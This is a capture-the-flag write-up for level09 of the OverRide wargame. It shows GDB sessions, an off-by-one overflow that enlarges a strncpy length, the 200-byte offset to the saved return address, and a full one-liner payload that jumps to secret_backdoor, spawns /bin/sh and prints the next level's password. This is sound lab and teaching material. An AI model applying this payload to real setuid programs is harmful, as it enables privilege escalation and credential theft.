# level09

```bash
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
Partial RELRO   No canary found   NX enabled    PIE enabled     No RPATH   No RUNPATH   /home/users/level09/level09
level09@OverRide:~$ file level09 
level09: setuid setgid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0xa1a3a49786f29814c5abd4fc6d7a685800a3d454, not stripped
```

In GDB, addresses are not accurate until the program is running.

```gdb
(gdb) info function secret_backdoor 
All functions matching regular expression "secret_backdoor":
Non-debugging symbols:
0x000055555555488c  secret_backdoor
```

In `set_username` function, we will write 41 bytes to begin to overflow the same buffer use in `set_msg` function. The byte after the 40 is the length used in the `strncpy` of `set_msg`.

We can see that with the following command, EIP is overwritten:

```gdb
(gdb) r <<< $(python -c "print 40 * 'a' + '\xff' + '\n' + 'A' * 2000")
Starting program: /home/users/level09/level09 <<< $(python -c "print 40 * 'a' + '\xff' + '\n' + 'A' * 2000")
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
>: Enter your username
>>: >: Welcome, aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa�>: Msg @Unix-Dude

Breakpoint 2, 0x00005555555549c6 in set_msg ()
(gdb) c
Continuing.
>>: >: Msg sent!

Program received signal SIGSEGV, Segmentation fault.
0x0000555555554931 in handle_msg ()
(gdb) x/i 0x0000555555554931
   0x555555554931 <handle_msg+113>:     ret
(gdb) i f
Stack level 0, frame at 0x7fffffffe5e8:
 rip = 0x555555554931 in handle_msg; saved rip 0x4141414141414141
 called by frame at 0x7fffffffe5f8
 Arglist at 0x4141414141414141, args: 
 Locals at 0x4141414141414141, Previous frame's sp is 0x7fffffffe5f0
 Saved registers:
  rip at 0x7fffffffe5e8
```

We overwrite here on the `eip` of `handle_msg` function.

```gdb
=> 0x00005555555549c6 <+148>:   call   0x555555554720 <strncpy@plt>
(gdb) x/wx $rdi
0x7fffffffe520: 0x0000000a
(gdb) p/d 0x7fffffffe5e8-0x7fffffffe520
$8 = 200
```

We can see here that the address of `eip` in `handle_msg` is 200 bytes far from the destination address of `strcnpy`.

The last thing is that `secret_backdoor` function uses `fgets` before calling `system`. We just need to pass `/bin/sh`.

Try to get the flag:

```bash
level09@OverRide:~$ (python -c "print 40 * 'a' + '\xd0' + '\n' + 'A' * 200 + '\x8c\x48\x55\x55\x55\x55\x00\x00' + '\n' + '/bin/sh'";cat) | ./level09
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
>: Enter your username
>>: >: Welcome, aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa�>: Msg @Unix-Dude
>>: >: Msg sent!
whoami
end
cat /home/users/end/.pass
j4AunAPDXaJxxWjYEUxpanmvSgRDV3tpA5BEaBuE
```
